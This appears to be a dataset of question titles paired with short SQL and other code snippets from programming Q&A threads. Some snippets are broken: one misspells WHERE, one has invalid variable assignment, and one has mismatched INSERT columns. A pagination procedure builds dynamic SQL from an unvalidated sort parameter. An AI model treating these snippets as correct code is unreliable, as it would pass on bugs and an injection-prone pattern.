8780,25492,Getting Default Constraints Information,"SELECT  c.name , 
        col.name, 
        c.definition
FROM    Rem.sys.default_constraints c 
        INNER JOIN Rem.sys.columns col ON col.default_object_id = c.object_id 
        INNER JOIN Rem.sys.objects o ON o.object_id = c.parent_object_id 
        INNER JOIN Rem.sys.schemas s ON s.schema_id = o.schema_id 
"
32031,54293,Blank out duplicate column values in SQL Reporting Services,"=IIf(Previous(Fields!Col1.Value) = Fields!Col1.Value, Nothing, Fields!Col1.Value)
"
31524,36147,Run a query where it displays records that have duplicate values across two columns but where it has distinct records on another column,"select column1,
       column2,
       count(distinct column3) as num_duplicates
  from table
 group by column1, column2
having count(distinct column3) > 1
 order by 3 desc
"
602,13612,SQL copy row with a new ID after change happens,"CREATE TRIGGER [dbo].[UPDT_DIENSTLEISTUNG]
   ON [dbo].[DIENSTLEISTUNG]
   AFTER  UPDATE
AS

BEGIN
 SET  NOCOUNT ON;

DECLARE @MAX_ID INT;
SELECT @MAX_ID=MAX(ID) FROM DIENSTLEISTUNG;

declare @tmp Table(ID  int,     BEZEICHNUNG varchar(20), PREIS varchar(20),
     UPDATE_DATE datetime,      FLAG bit)

insert into @tmp
select ID,BEZEICHNUNG,PREIS,UPDATE_DATE,1 [flag] from deleted;

delete T from DIENSTLEISTUNG T JOIN @tmp I
ON T.ID=I.ID

INSERT INTO DIENSTLEISTUNG
SELECT @MAX_ID+ROW_NUMBER() OVER(ORDER BY ID) [ID],BEZEICHNUNG,PREIS,GETDATE(),0 
FROM INSERTED

INSERT INTO DIENSTLEISTUNG
select * from @tmp


 SET  NOCOUNT OFF;
END;
"
38639,29417,Using Count to find the number of occurrences,"select car_made, count(*) from cars
group by car_made
"
15274,69607,Get balance in sqlite3,"SELECT id,
       name,
       (SELECT TOTAL(value)
        FROM Debit
        WHERE user_from = User.id
          AND user_to   = 1) -
       (SELECT TOTAL(value)
        FROM Debit
        WHERE user_to   = User.id
          AND user_from = 1) AS amount
FROM User
WHERE amount <> 0;

id          name        amount    
----------  ----------  ----------
2           Marie       19.77     
3           Peter       -2.45     
"
16527,18780,Is it possible to use a variable counter that updates itself after an ORDER BY,"set @a:=0;

SELECT doc, @a as before, mov, (@a:=@a+mov) as after, date  
FROM
(
    SELECT doc,  movement as mov, date 
    FROM movements m
    LEFT JOIN (
    SELECT doc, 1 as tdoc, date
    FROM invoices
    UNION ALL
    SELECT doc, 2 as tdoc, date
    FROM nulled
    ) sub
    ON m.doc=sub.doc and m.doc_type = sub.tdoc
    WHERE m.product_id=""XXXX""
    order by date
) as x
"
26788,9508,Set value to variable and modify based on condition SQL,"select @variable = case
                        when max(max_val) > @variable then @variable
                        else max(max_val)
                    end
from dataset
where account_id = 'abc'
and product = 'xyz'
"
27613,67820,SQL Select Query With Count And Where Statement,"SELECT Name, Count(*) As Total
FROM Table
WHERE Date = Today AND Type = 1
GROUP BY Name
"
26411,38578,SQL Comparing values in two rows,"SELECT 
    a.category, 
    CASE WHEN a.salesVolumes < b.salesVolumes THEN 'TRUE' ELSE 'FALSE' END AS salesIncreasing
FROM MyTable a
INNER JOIN MyTable b ON a.category = b.category
WHERE a.year = 2002
AND b.year = 2003
"
11669,38180,Converting numeric date column into date and time in SQL,";WITH CTE AS
(
    SELECT  CONVERT(DATETIME,LEFT([Date],8)+' '+
                             SUBSTRING([Date],10,2)+':'+
                             SUBSTRING([Date],12,2)+':'+
                             SUBSTRING([Date],14,2)+'.'+
                             RIGHT([Date],3)) [Date],
            ItemId,
            Parms,
            [OBJECT]
    FROM (  SELECT  ItemId,
                    CONVERT(VARCHAR(18),[Date]) [Date],
                    Parms,
                    [OBJECT]
            FROM YourTable
            WEHRE UserCode = 'Automation' AND ListType = 'M') A
)
SELECT  ItemId,
        CONVERT(DATE,[Date]) [Date],
        CONVERT(TIME(0),[Date]) [Time],
        SUBSTRING(Parms,1,6) +' Was removed from:' RemovalPath,
        [OBJECT] [MOVE LIST]
FROM CTE
WHERE [Date] >= CONVERT(DATE,DATEADD(DAY,-4,GETDATE()))
"
19156,51080,SQL - Summing from two different tables,"SELECT A.Position,
       A.Total_Weeks,
       A.Total_hours
FROM   (SELECT Position.type                        AS 'Position',
               Sum(RegularRecuitment.numberOfWeeks) AS 'Total_Weeks'
        FROM   Position
               JOIN StaffRequest
                 ON Position.positionID = StaffRequest.positionID
               JOIN Recruitment
                 ON StaffRequest.requestID = Recruitment.requestID
               JOIN RegularRecuitment
                 ON Recruitment.recruitmentID = RegularRecuitment.recruitmentID
        GROUP  BY Position.type) a
       JOIN (SELECT Position.type                   AS 'Position',
                    Sum(RegRecruitWeeklyTime.hours) AS 'Total_hours'
             FROM   Position
                    JOIN StaffRequest
                      ON Position.positionID = StaffRequest.positionID
                    JOIN Recruitment
                      ON StaffRequest.requestID = Recruitment.requestID
                    JOIN RegularRecuitment
                      ON Recruitment.recruitmentID = RegularRecuitment.recruitmentID
                    JOIN RegRecruitWeeklyTime
                      ON RegRecruitWeeklyTime.recruitmentID = RegularRecuitment.recruitmentID
             GROUP  BY Position.type) b
         ON A.Position = B.Position 
"
29579,8249,How can I return datetime constant with datetime type in SQL Server?,"select convert(datetime,'20010528 08:47:00.000')as DateField
or 
select cast('20010528 08:47:00.000'  as datetime)as DateField
"
4022,74752,"SQL syntax issue using ""IN"" keyword with dynamic data","IN (SELECT myField from #myTable)
"
33276,66837,how to replace string values of column values by SQL Stored Procedure,"UPDATE MyTable SET ColumnNeedUpdate = 
    REPLACE(ColumnNeedUpdate, 'l:\xyz\sfd\', '')
WHERE UserId = 2565
"
18461,36408,How to reuse the part of query,"SELECT *
  FROM (
    SELECT loc.*
         , distance(ci.coord1, ci.coord2, :latitude, :longitude) as dist
      FROM location loc
      JOIN rl_retailer_location rrl on rrl.location_id = loc.location_id
      JOIN contact_info ci on ci.contact_info_id=loc.contact_info_id
     WHERE rrl.retailer_id=:retailerId
     ) loc
 WHERE dist <= :radius
 ORDER BY dist ASC
"
2938,68164,Can this simple SQL query be optimized?,"SET STATISTICS IO ON
SET STATISTICS TIME ON

SELECT COUNT(*)  
FROM Address adr INNER JOIN  
     Auditable a on adr.UniqueId = a.UniqueId 
OPTION (LOOP JOIN)

SELECT COUNT(*)  
FROM Address adr INNER JOIN  
     Auditable a on adr.UniqueId = a.UniqueId 
OPTION (MERGE JOIN)

SELECT COUNT(*)  
FROM Address adr INNER JOIN  
     Auditable a on adr.UniqueId = a.UniqueId 
OPTION (HASH JOIN)
"
22475,45476,MySQL batch update statement with different IDs,"UPDATE table_name
   SET a = CASE WHEN id = 1
                THEN 'something'
                WHEN id = 2
                THEN 'something else'
                WHEN id = 3
                THEN 'another'
           END
 WHERE id IN (1,2,3)
;
"
16437,22138,How to put products in a category by query,"INSERT INTO ps_category_product (id_category,id_product)
SELECT 2, ps_product_shop.id_product 
FROM ps_product_shop 
WHERE ps_product_shop.id_product > 10232 AND ps_product_shop.id_product < 10248
"
12508,4123,SQL Update Multiple Rows with Multiple Values,"UPDATE [MyTable]
SET HelpLink = CASE ID
        WHEN 2 THEN 'MKSDefectsChart.png'
        WHEN 6 THEN 'EPMRisks.png'
        WHEN 7 THEN 'DCTSHardwareChanges.png'
        ELSE NULL
    END
WHERE ID IN (2, 6, 7)
"
22537,2643,SELECT .. SELECT in Mysql,"SELECT * FROM user WHERE 
(`user_name` like '%TOM%' OR `user_name` like '%AN%' and `login_datetime` BETWEEN '2013-01-01 00:00:00' and '2013-02-31 23:59:59') OR
NOT ( --NOR
   (`user_name` like '%PHP%' OR `user_name` like '%BA%' and `login_datetime` BETWEEN '2013-02-01 00:00:00' and '2013-03-31 23:59:59') OR
   (`user_name` like '%SUN%' OR `user_name` like '%MOON%' and `login_datetime` BETWEEN '2013-03-01 00:00:00' and '2013-04-31 23:59:59')
) OR
NOT ( --NAND
   (`user_name` like '%RAJ%' OR `user_name` like '%MUTH%' and `login_datetime` BETWEEN '2013-04-01 00:00:00' and '2013-06-31 23:59:59') AND
   (`user_name` like '%BAG%' OR `user_name` like '%LAP%' and `login_datetime` BETWEEN '2013-05-01 00:00:00' and '2013-07-31 23:59:59')
)
"
12545,41648,Using regular expression within a stored procedure,"'([^a-z])'
"
25924,48738,How to select the reserved word (limit) in postgres,"select ""limit"" 
from companies;
"
11182,59661,ScalaQuery multiple primary key & foreign key,"object myTable2 extends Table([Int, Int, Int])(""myTable2"") {
  def pk1 = column[Int](""id1"")
  def pk2 = column[Int](""id2"")
  def fk1 = column[Int](""fk1"")
  def * = pk1 ~ pk2 ~ fk1
  def pk = primaryKey(""pk_myTable2"", pk1 ~ pk2)
  def fkMyTable1 = foreignKey(""myTable1_fk"", fk1, myTable1)(_.id)
}
"
35927,61415,SQL Query to Transpose Column Counts to Row Counts,"Select 
case when profile.foo ~* '5.0.2195' then 'Win2k'
     when profile.foo ~* '5.1.2600' then 'WinXP' 
     when profile.foo ~* '5.2.3790' then 'W2k3'
     when (profile.foo ~* '6.0.6000'
        or profile.foo ~* '6.0.6001'
        or profile.foo ~* '6.0.6002') 
        then 'Vista'
     when (profile.foo ~* '6.1.7600'
        or profile.foo ~* '6.1.7601')
        then 'Win7'
     when profile.foo ~* '6.2.9200' then 'Win8'
     when (profile.foo ~* '6.3.9200'
        or profile.foo ~* '6.3.9600')
        then 'Win8.1' ELSE 'Other' END as type,
     count(*) as cnt
From profile
GROUP BY 1
"
22849,1686,How to increase a numeric attribute value in a database by a percentage using SQL,"UPDATE Instructor
SET salary = salary * 1.1
WHERE department_id=1
"
38318,54284,SQL function question,"SET @_result = REPLACE(@_result, '&', 'eseses')
SET @_result = REPLACE(@_result, '-', 'vagyvagy')
"
34685,59160,Convert Varchar2 to Char array in Oracle,"SQL> ed
Wrote file afiedt.buf

  1  declare
  2    type char_arr is table of char(1) index by pls_integer;
  3    l_str varchar2(100) := 'ABCDEF';
  4    l_arr char_arr;
  5  begin
  6    for i in 1 .. length(l_str)
  7    loop
  8      l_arr(i) := substr( l_str, i, 1 );
  9    end loop;
 10    dbms_output.put_line( l_arr.count );
 11* end;
SQL> /
6

PL/SQL procedure successfully completed.
"
1456,54872,Oracle Conditional Index with two identifiers,"CREATE UNIQUE INDEX idx_dup_wfc
    ON WF_WORKFLOW_CLASS 
     (CASE WHEN is_active = 1 THEN NAME END
     ,CASE WHEN is_active = 1 THEN DEPT_OWNER END
     )
"
11571,74233,trim left characters in sql server?,"select substring( field, 1, 5 ) from sometable
"
25826,74516,Update on SQL join,"INSERT INTO EMPLOYEE_GOAL_TABLE (EmployeeID, ISGoal1) 
SELECT EMPLOYEE_TABLE.EmployeeID, 'yes' 
FROM EMPLOYEE_TABLE 
WHERE EMPLOYEE_TABLE.EmployeeID NOT IN
(
   SELECT DISTINCT EMPLOYEE_GOAL_TABLE.EmployeeID
   FROM EMPLOYEE_GOAL_TABLE
)
"
33552,75353,How do I parse the middle string between two characters (dashes )in sql,"CREATE FUNCTION dbo.funcSplitToTable
/*
   Split a string into parts base on a separation character to produce
   a table that has one column containing the results of the split.

   EXAMPLE:
      SELECT * FROM dbo.funcSplitToTable( '~', 'MAINT~12221~10001~10/25/2004~CANCELLED~1' )
      SELECT * FROM dbo.funcSplitToTable( '~', '' )
      SELECT * FROM dbo.funcSplitToTable( '~', NULL )
      SELECT * FROM dbo.funcSplitToTable( NULL, 'MAINT~12221~10001~10/25/2004~CANCELLED~1' )
      SELECT * FROM dbo.funcSplitToTable( '', 'MAINT~12221~10001~10/25/2004~CANCELLED~1' )

   RETURN:
      Table with one column containing resulting strings.
*/
(
    @strSearch       AS varchar(255)            -- String to search for.
   ,@strText         AS varchar(MAX )           -- Text to search for string.
)
RETURNS @tblResult TABLE (
    rowid       int NOT NULL identity(1,1),
    result      varchar(MAX) NOT NULL,
    PRIMARY KEY (rowid)
)
AS
BEGIN
    DECLARE @iLastPos        int
          , @iPos            int
          , @lngSearch       int
          , @lngText         int
          , @lngSubstring    int
          , @strResult       varchar(MAX)
          ;
    IF @strText IS NULL RETURN ;
    SET @lngText = LEN(@strText + 'X') - 1 ;

    IF @strSearch IS NULL SET @strSearch = '' ;
    SET @lngSearch = LEN(@strSearch + 'X') - 1 ;

    IF @lngSearch <= 0
    BEGIN
        INSERT INTO @tblResult
        SELECT @strText AS result
        ;
        RETURN ;
    END

    SET @strResult    = NULL ;
    SET @iLastPos     = 1 ;
    SET @iPos         = CHARINDEX( @strSearch, @strText ) ;

    WHILE @iPos > 0
    BEGIN
        SET @lngSubstring = @iPos - @iLastPos ;
        IF @lngSubstring > 0
            INSERT INTO @tblResult
            SELECT SUBSTRING( @strText, @iLastPos, @lngSubstring ) AS result
            ;
        SET @iLastPos  = @iPos + @lngSearch ;
        SET @iPos      = CHARINDEX( @strSearch, @strText, @iLastPos ) ;
    END

    SET @lngSubstring = @lngSearch + @lngText - @iLastPos ;
    IF @lngSubstring > 0
        INSERT INTO @tblResult
        SELECT SUBSTRING( @strText, @iLastPos, @lngSubstring ) AS result
        ;
    RETURN ;
END
"
36567,68296,"Count number of instances, and put them in a column while grouping by another column","select UserID, 
   sum(case when LoginDate between '2013-01-01' and '2013-01-31' then 1 else 0 end ),
   sum(case when LoginDate between '2013-02-01' and '2013-02-28' then 1 else 0 end )
from Table
group by UserID
"
4753,74670,Oracle varchar2 equivalent in sql server,"select * from #temp where name like 'one ' --one with space at end
"
21896,38478,Assigning a Variable and a Column to a Value,"UPDATE T_Example
    SET ExampleColumn = (@ExampleVar := 0)
    WHERE ExampleColumn2 = @ExampleVar2;
"
8741,7800,Oracle SQL query to group consecutive records,"SELECT line_no,
       amount,
       narration,
       SUM( x ) OVER ( ORDER BY line_no
                       ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW 
       ) as calc_group
FROM (
  SELECT t.*,
         CASE lag( narration ) OVER (order by line_no ) 
         WHEN narration THEN 0
         ELSE 1 END x
  FROM test t

)
ORDER BY line_no
"
9377,66785,MySQL - How do I order the results randomly inside a column?,"SELECT orders.* 
FROM orders 
INNER JOIN (SELECT userid, RAND() as random FROM users) tmp
ON orders.userid = tmp.userid
ORDER BY tmp.random, tmp.userid
"
30137,27713,Get checkbox name from SQL Server Version 1,"Dim sb as CheckBox = CType(Me.Controls.Item(dt.rows(0)(""cbName"")), CheckBox)
"
9180,45314,Distinguishing Tag and Category names in SQL query replace,"UPDATE
      WP_TERMS
SET
      NAME      =
          REPLACE ( NAME,
                  'pattern',
                  'motif' )
WHERE
      TERM_GROUP LIKE '0'
      AND NAME = SLUG;
"
1533,13027,DB Normalization and single field break outs,"CHECK(type IN ('multi-family','single-family','healthcare','commercial'))
"
27587,7267,How to update the PK of every record,"UPDATE A
SET [GUID] = (
  SELECT [GUID] 
  FROM B
  WHERE EXISTS (
    SELECT A.Animal,A.Person,A.Vehicle
    INTERSECT
    SELECT B.Animal,B.Person,B.Vehicle
  )
)
"
37285,9903,"Binary ""OR"" operation on a SQL column",";with PowersOf2
as
(
    select 1 as Number
    union all
    select A.Number * 2 from PowersOf2 as A where A.Number < 64
)
select P.PERSON_NAME, sum(distinct P.PERSON_DAY & PowersOf2.Number)
from PERSON_DAYS as P
    left outer join PowersOf2 on PowersOf2.Number <= P.PERSON_DAY
where P.PERSON_ID = @myId
group by P.PERSON_NAME
"
19791,20910,join three tables on a condition of the thirst table,"SELECT op.*, g.*, gp.* 
FROM openid AS op 
INNER JOIN users AS g ON g.userid = op.userid
INNER JOIN profiles AS gp ON gp.userid = op.userid
WHERE op.openid = 2
"
13787,39289,database performance around storing and querying bi-directional relationships,"SELECT relationshipId, user1Id, user2Id
FROM RelationshipTable
WHERE userID1 = [terrysID] 
union all
SELECT relationshipId, user2Id, user1Id
from RelationshipTable
where userID2 = [terrysID]
"
22574,6266,SQL: Seeking an advise for tables structure etc,"SELECT DISTINCT msgID, msgSubject, msgBody -- and so on
FROM messages m
LEFT JOIN small_group_visibility sg
  ON sg.msg_id = m.msg_id
LEFT JOIN big_group_visibility bg
  ON bg.msg_id = m.msg_id
WHERE
  sg.group_id IN (1, 2, 3) OR
  bg.group_id IN (10, 20);
"
1146,13665,Trouble Aggregating Rows with SQL Statement,"Select ContractDate, 
     max(case when Vendor = 'AirDat' THEN Vendor_Average End) as AirDAT,  
     max(case when Vendor = 'CWG' THEN Vendor_Average End) as CWG
  from (
  SELECT [ContractDate] , Vendor, (sum(wf.Temppop) / sum(wf.Population)) as Vendor_Average
  FROM [ECPDB].[dbo].[weather.forecast] as wf 
  inner join ecpdb.[lookup].[newWeatherStation] as ws
     on wf.[Station_ID] = ws.[Station ID]
  inner join ecpdb.[lookup].[CountyNew] as c
     on ws.[County FIPS] = c.[County FIPS]
  where tradedate = '7/2/2012' and [BENTEK Cell] = 'Northeast' 
group by ContractDate, Vendor
) as Subquery
     group by Contractdate
"
1126,66068,About sql subquery,"Select ename,salary 
from emp 
where salary> (select max(salary)
               from emp
               where ename in ('A', 'B', . . . )
              )
"
16772,21491,SQL Update secondary table with data from first table,"# NULL for appID
INSERT INTO Applications 
VALUES (NULL, ""app name"") 

# NULL for fileID, LAST_INSERT_ID() for recently inserted appID
INSERT INTO files 
VALUES (NULL, LAST_INSERT_ID(), ""file name"") 
"
35961,54795,how to get the month and year value for the give financial year,"DECLARE @nYearInput AS CHAR(4)
DECLARE @start DATETIME, @end DATETIME

SET @nYearInput = '2013'  -- Change your input here

SET @start = CAST(@nYearInput AS VARCHAR) + '0401'
SET @end= CAST(@nYearInput + 1 AS VARCHAR) + '0301'

;WITH cte AS 
(
    SELECT dt = DATEADD(DAY, -(DAY(@start) - 1), @start)

    UNION ALL

    SELECT DATEADD(MONTH, 1, dt)
    FROM cte
    WHERE dt < DATEADD(DAY, -(DAY(@end) - 1), @end)
)
SELECT YEAR(dt) AS Year, month(dt) AS month
FROM cte
"
5252,7943,Use year and month of a datetime column as a Table key,"create unique index UX_YourTable_YearMonth on YourTable(year, month)
"
6221,61793,Pagination with the stored procedure,"CREATE PROCEDURE [sp_Mk]
 @page INT,
 @size INT,
 @sort nvarchar(50) ,
 @totalrow INT  OUTPUT
AS
BEGIN
    DECLARE @offset INT
    DECLARE @newsize INT
    DECLARE @sql NVARCHAR(MAX)

    IF(@page=0)
      BEGIN
        SET @offset = @page
        SET @newsize = @size
       END
    ELSE 
      BEGIN
        SET @offset = @page+1
        SET @newsize = @size-1
      END
    SET NOCOUNT ON
    SET @sql = '
     WITH OrderedSet AS
    (
      SELECT *, ROW_NUMBER() OVER (ORDER BY ' + @sort + ') AS ''Index''
      FROM [dbo].[Mk] 
    )
   SELECT * FROM OrderedSet WHERE [Index] BETWEEN ' + CONVERT(NVARCHAR(12), @offset) + ' AND ' + CONVERT(NVARCHAR(12), (@offset + @newsize)) 
   EXECUTE (@sql)
   SET @totalrow = (SELECT COUNT(*) FROM [Mk])
END
"
12849,44085,Excel : sum of values depending of other values,"=SUMIF(B:B,""<0"",A:A)
"
21299,31457,activerecord sql difficult query,"class Item < ActiveRecord::Base
  def self.what_you_want_to_achieve
    item_ids = where(""item_info_id IS NOT NULL"")
              .select("" DISTINCT on(item_info_id, volume) items.item_info_id, items.volume, items.id "")
              .map(&:id)

    where(:id => item_ids).published.products.price_between(2,823489).order(:price)
  end
"
16105,29443,Fetch results added today no earlier,"select s.articleId
from stock s
group by s.articleId
having min(tstamp_in) > '2015-01-12'
"
17326,60601,Synchronize local database with external API,"INSERT INTO keywords(api_adgroup_id, api_keyword_id, keyword_text, match_type, status) 
SELECT a.api_id, a.keyword_text, a.match_type, a.status
FROM tmp_keywords a LEFT JOIN keywords b ON a.api_adgroup_id = b.api_adgroup_id AND a.api_keyword_id = b.api_keyword_id
WHERE b.api_keyword_id IS NULL
"
36062,60907,Update table from other table where row equal with a value,"UPDATE  [dbo].[TABLE1]
SET     CapelaWin  = 2,
        ProcyonWin = 1
from [dbo].[TABLE1] inner join [dbo].[TABLE2] on [dbo].[TABLE1].fld1 =[dbo].[TABLE1].fld2
WHERE   [dbo].[table2].[VictoryNation] = 1;
"
28620,54629,Get all dates in date range in SQL Server,"declare @T table
(
  ID int identity primary key,
  FromDate date,
  ToDate date
)

insert into @T values
('2011-11-10', '2011-11-12'),
('2011-12-12', '2011-12-14')

select row_number() over(order by D.Dates) as SN,
       D.Dates
from @T as T
  inner join master..spt_values as N
    on N.number between 0 and datediff(day, T.FromDate, T.ToDate)
    cross apply (select dateadd(day, N.number, T.FromDate)) as D(Dates)
where N.type ='P'
"
3731,30408,Subtracting value based on the other table,"SELECT  a.employee,
        a.day,
        b.hours - COALESCE(c.hours,0) totalHours
FROM    crew a
        INNER JOIN work b
            ON a.day = b.day
        LEFT JOIN `break` c
            ON a.employee = c.employee AND
                a.day = c.day
-- WHERE    b.day = 4
"
37967,39553,sql query if parameter is null,"where (@dob is null or cs.dob = @dob) ...
"
5841,48924,SQL - getting totals from a crosstab query,"TRANSFORM Count(Research.Patient_ID) AS CountOfPatient_ID
SELECT  SWITCH (Age <= 22, ""Under 22"",
        Age > 22 and AGE <= 24 , ""Between 22 And 24"",
                Age > 24 and AGE <= 26,  ""Between 24 And 26"",
                Age > 26 , ""Over 26"") as Age_Range
FROM 
   (Research
    INNER JOIN (SELECT ID,  DateDiff(""yyyy"",DOB,Date()) as AGE
        FROM Demographics) Demographics
    ON Research.Patient_ID = Demographics.ID) 
    INNER JOIN [Letter Status] 
    ON Research.Patient_ID = [Letter Status].Patient_ID

GROUP BY  AGE


PIVOT [Letter Status].Letter_Status;
"
13300,44254,Get Root parent of child in Hierarchical table,"declare @id int=6
;WITH parent AS
(
    SELECT id, parentId  from tbl WHERE id = @id
    UNION ALL 
    SELECT t.id, t.parentId FROM parent
    INNER JOIN tbl t ON t.id =  parent.parentid
)

SELECT TOP 1 id FROM  parent
order by id asc
"
5853,7123,ORM: Select from table A only if id exists in table B,"from sqlalchemy import exists, select
q = select([A.id, A.number]).where(exists(select([B.id])))
"
33300,34787,How to use regular expression in Oracle SQL query,"select *
from  MYTABLE t 
WHERE REGEXP_LIKE (t.DESCRIPTION, '[a-z]', 'c')
"
36526,46326,Build select result based on multiple column values,"select case AfricanAmerican when 1 then 'African American/' else '' end
        + case White when 1 then 'White/' else '' end
        + case Hispanic when 1 then 'Hispanic/' else '' end
    from PersonTable
"
27136,26083,SQL Server : grouping on partial text matching,"SELECT 
    SUBSTRING(name, 1, 15) + '0000.comp.trn', SUM(size)
FROM 
    dbo.CLName
GROUP BY 
    SUBSTRING(name, 1, 15)
"
18857,20058,"Help with T-SQL script: Insert record, then use identity of that insert on another statement?","DECLARE @Id1 INT
DECLARE @Id2 INT

INSERT INTO tableA VALUES ('blah', 'blah')

SET @Id1 = SELECT SCOPE_IDENTITY()

INSERT INTO tableB VALUES (IDENTITY_FROM_A_INSERT, 'foo')

SET @Id2 = SELECT SCOPE_IDENTITY()

INSERT INTO tableC VALUES (@Id1, @Id2)
"
25177,55852,SQL Case with multiple values,"SELECT Name, CASE WHEN statusid < 4 THEN 'Alive'
                  WHEN statusid = 4 THEN 'Dying'
                  ELSE 'Dead' END AS some_alias
  FROM people
"
9497,69874,What do the : and ' operators mean,"EXECUTE IMMEDIATE 'UPDATE mytable SET age = 25 WHERE age = :1' 
     USING IN localVarAge;
"
19438,5857,Nested GROUP BY optimization,"SELECT trip_id, stop_id, COUNT(*) as cnt 
FROM operation_ticket_part_stops 
GROUP BY trip_id, stop_id
ORDER BY cnt DESC
LIMIT 1
"
1715,21986,SQL Query Substring Query,";with cte as
(
  select cast('<r><i>'+replace(BarType,'_','</i><i>')+'</i></r>' as xml) as xmlcol
  from TestDataFoo
)
select 
  r.value('i[1]', 'varchar(50)') as element1,
  r.value('i[2]', 'varchar(50)') as element2,
  r.value('i[3]', 'varchar(50)') as element3
from cte
  cross apply xmlcol.nodes('r') r(r)  
"
25432,10499,How to retrieve a result set of all tables in the DB with their disk space usage,"create table #Temp (
    name nvarchar(128),
    [rows] char(11),
    reserved varchar(18),
    data varchar(18),
    index_size varchar(18),
    unused varchar(18)
)

insert into #Temp
    exec sp_msforeachtable 'sp_spaceused ''?'''

select * from #Temp order by cast(replace(reserved,' kb','') as int) desc
"
6188,54897,How can I clean up this report using LISTAGG?,"select
*
from
(
SELECT doc_number, LISTAGG(field || '=' || text, '; ') 
WITHIN GROUP (ORDER BY field) OVER (PARTITION BY doc_number) as Bob
FROM record
) t1
group by
doc_number,
bob
"
11749,75263,How to run a specific sql query for every row in the table?,"SELECT c.FromIDNumber, m.Timestamp, m.X, m.Y
FROM Communication c
JOIN Movement m ON c.FromIDNumber = m.IDNumber
WHERE m.TimeStamp = (SELECT MIN(mm.Timestamp)
                     FROM Movement mm
                     WHERE mm.TimeStamp >= c.TimeStamp)
"
35499,70309,How to select all records from first table and only first matching record from second table?,"SELECT T1.Number, T2.Column1, T2.Column3 
FROM FirstTable T1
LEFT JOIN ( SELECT ID, NUMBER, Colunmn2, Column3,
              ROW_NUMBER() OVER (PARTITION BY Number ORDER BY ID ASC) as NumOrder
            FROM SecondTable
) T2 ON T1.Number = T2.Number AND T2.NumOrder = 1
"
33789,10119,How to change column type in SQL view,"CASE WHEN (LEN(PartnerID) = 5 AND (PartnerID LIKE '11%' OR
                      PartnerID LIKE '22%')) THEN stuff(PartnerID, 1, 2, '00') ELSE CONVERT(VARCHAR(5), PartnerId) END AS PartnerID
"
27925,5041,How to add a delimiter at a particular position in Oracle,"with v_data(val) as (
  select '123456' from dual union all
  select 'abcdef' from dual union all
  select '678' from dual
)
select 
  val, 
  regexp_replace(val, '(\d+)(\d{2})', '\1.\2') 
from v_data
"
7359,25911,SQL: Deleting row which values already exist,"DECLARE @t TABLE
    (
      ID INT ,
      DATE DATE ,
      VALUE_1 CHAR(1) ,
      VALUE_2 CHAR(1)
    )

INSERT  INTO @t
VALUES  ( 1, '20151127', 'A', 'B' ),
        ( 2, '20151128', 'C', 'B' ),
        ( 3, '20151129', 'A', 'B' ),
        ( 4, '20151130', 'A', 'B' );
WITH    cte1
          AS ( SELECT   * ,
                        ROW_NUMBER() OVER ( ORDER BY date)
                        - ROW_NUMBER() OVER ( PARTITION BY VALUE_1, VALUE_2 ORDER BY DATE) AS gr
               FROM     @t
             ),
        cte2
          AS ( SELECT   * ,
                        ROW_NUMBER() OVER ( PARTITION BY VALUE_1, VALUE_2, gr ORDER BY date) AS rn
               FROM     cte1
             )
    DELETE  FROM cte2
    WHERE   rn > 1

SELECT  *
FROM    @t
"
22836,52763,Microsoft T-SQL XML Parsing Issue,"
; WITH XMLNAMESPACES('http://foobar' as Y)
SELECT 
    f.x.value('.', 'varchar(10)')
from 
    @xml.nodes('/RootElement/Y:SubElement') as f(x)
"
1087,74160,Is Database Normalized Enough/Properly?,"CREATE TABLE IF NOT EXISTS `boosts` (
  `habitat_list_id` int(10) NOT NULL,
  `element_id` int(5) NOT NULL,
  PRIMARY KEY  (`habitat_list_id`,`element_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
"
4987,71611,Need SQL Server SELECT To Return Previous Record Based On A DateTime,"select top 1 [TargetUnit], [TargetDate]
  from tbl
 where [TargetDate] < GETDATE()
 order by [TargetDate] desc
"
367,31478,median in SQLusing abs,"--the subquery will return the 1 or 2 middle values and the average of those is the median
select avg(sales * 1.0) as median 
  from (
    select g1.sales
           --this creates a cartesian product of ga with itself
      from ga g1, ga g2 
           --and then group by sales, which allows comparision of each given sales figure all others
     group by g1.sales 
    having 
      --the sum(case) here acts a count of row in the cartesian product that have matching sales values
      --this will be the the square of the count() from ga where for each given sales number
      sum(
        case 
          when g1.sales = g2.sales 
          then 1 
          ELSE 0 
        END) 

       >= --The comparison acts as a de-weighting mechanism to handle duplicate sales numbers
          --Such that if I have the same sales figure twice I'll have 4 rows in the Cartesian product
          --and I should see a matching 4 or 0 if the row can be used in the final median calculation

       --the abs(sum(sign())) here acts as a measure of how far of the median each sales is
       --by looking at how many sales are greater then, equal, a lesser. The sales at or nearest
       --the median will have the lowest numbers here.
       ABS(
         SUM(
           SIGN(g1.sales-g2.sales)
         )
     )
   )g3;
"
31043,8615,How to model this one-to-one relation?,"if(usertype==admin)
  select * from  admins where userid=:id;
else    
  select * from  general where userid=:id;
"
31668,6756,SQL sub total and final total query,"SELECT oi.PurchaseID,
       SUM(oi.Quanity * CONVERT(decimal(18,2), p.ItemPrice)) AS sub_total
FROM vwPurchaseType oi JOIN
     tblColor p
     ON p.ColorID = oi.ColorID
WHERE oi.UserID = 1
GROUP BY oi.PurchaseID WITH ROLLUP;
"
34470,23740,Postgres - Returning the row with the most recent timestamp from each group with matching checksums,"SELECT DISTINCT ON (licensekeys_checksum) *
FROM   tsrs
ORDER  BY licensekeys_checksum, timestamp DESC;
"
6662,43125,Stock system - SQL not showing out of stock items,"SELECT name, status, sum(case when status IN (0,3) then 1 else 0 end) AS count
FROM stock_item 
GROUP BY si.name, si.status
ORDER BY count ASC;
"
27176,74712,Result set to be displayed in multiple textfields,"if (rs.next()) {
     String option = rs.getString(""options"");
     jAnswerA.setText(option);
};

if (rs.next()) {
     String optionB = rs.getString(""options"");
     jAnswerB.setText(optionB);
};
"
23915,31092,Simple example of how to use the Cassandra database (cql) and node.js,"var cassandra = require('cassandra-driver');
var client = new cassandra.Client({contactPoints: ['host1', 'host2']});
var query = 'SELECT email, last_name FROM user_profiles WHERE key=?';
client.execute(query, ['guy'], function(err, result) {
  console.log('got user profile with email ' + result.rows[0].email);
});
"
33751,31141,Quite a tricky SQL query,"SELECT DISTINCT ON (role) role, name, rating
FROM employee
ORDER BY role, rating DESC
"
8993,37475,JOIN the Strings of different textboxes and again SPLIT,"Private nameTextBoxName = ""txtName"" ' name textbox prefix
Private valueTextBoxName = ""txtValue"" ' value textbox prefix
Private paramSeparator = "";"" ' between sets of parameters
